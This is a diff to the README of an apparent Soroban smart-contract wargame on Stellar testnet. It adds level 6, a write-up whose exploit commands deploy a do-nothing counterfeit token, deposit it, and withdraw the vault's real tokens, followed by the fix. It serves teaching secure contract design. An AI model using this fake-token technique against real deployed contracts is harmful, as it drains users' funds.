@@ -25,7 +25,7 @@ stellar contract invoke --id $FACTORY --network testnet --source-account me \
   -- submit --player $ME --level_id <N>
 ```
 
-Levels 1 and 2 pay out in `LOOT`: open a trustline first.
+Levels 1, 2 and 6 pay out in `LOOT`: open a trustline first.
 
 ```bash
 stellar tx new change-trust --line $LOOT --source-account me --network testnet
@@ -108,3 +108,24 @@ stellar contract invoke --id $INSTANCE --network testnet --source-account me -- 
 Before the entry expires, `claim` fails with `Error(Contract, #1)` (Banned).
 
 **Fix.** Security state belongs in persistent storage, with a TTL you manage and extend. Temporary storage is for data you can afford to lose.
+
+## 6. Counterfeit
+
+**Bug.** `deposit(token, from, amount)` takes the token address from the caller, calls `transfer` on it, and credits `from` with `amount` if the call returns. Nothing checks that `token` is the game's token. In Soroban every address can be a contract, and the caller writes it, so `transfer` can do nothing and still "succeed". `withdraw` then pays the credit out in the real token.
+
+**Exploit.** Deploy a counterfeit token whose `transfer` does nothing (`attackers/level-06-fake-token`, 563 bytes), deposit it for the whole vault, and cash the credit in:
+
+```bash
+cd attackers/level-06-fake-token && stellar contract build      # needs overflow-checks = true in the release profile
+FAKE=$(stellar contract deploy --wasm target/wasm32v1-none/release/fake_token.wasm \
+  --network testnet --source-account me)
+
+stellar contract invoke --id $INSTANCE --network testnet --source-account me \
+  -- deposit --token $FAKE --from $ME --amount 10000000000
+stellar contract invoke --id $INSTANCE --network testnet --source-account me \
+  -- withdraw --to $ME --amount 10000000000
+```
+
+Your account needs a `LOOT` trustline to receive the payout. The attacker contract is the whole of the code that makes the level hard: it is only an empty `transfer(from, to, amount)`.
+
+**Fix.** Compare `token` with the token stored at construction and reject anything else. Never trust an address the caller hands you to behave like a token, an oracle or anything else you rely on.
